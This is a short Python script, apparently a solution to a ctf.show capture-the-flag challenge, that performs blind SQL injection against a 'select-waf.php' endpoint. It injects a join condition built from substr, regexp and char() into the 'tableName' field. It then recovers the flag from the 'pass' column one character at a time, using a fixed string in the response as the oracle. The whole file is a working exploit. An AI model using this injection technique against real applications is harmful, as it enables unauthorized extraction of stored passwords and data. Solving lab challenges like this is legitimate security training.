import requests

url = "http://0f848da3-76b8-42cd-b915-5687b130b4e9.chall.ctf.show/select-waf.php"

flag = 'flag{'
for i in range(45):
    if i <= 5:
        continue
    for j in range(127):
        data = {
            "tableName": f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1)regexp(char({j})))"
        }
        r = requests.post(url, data=data)
        if r.text.find("$user_count = 43;") > 0:
            if chr(j) != ".":
                flag += chr(j)
                print(data)
                print(flag)
                print(flag.lower())
                if chr(j) == "}":
                    exit(0)
                break

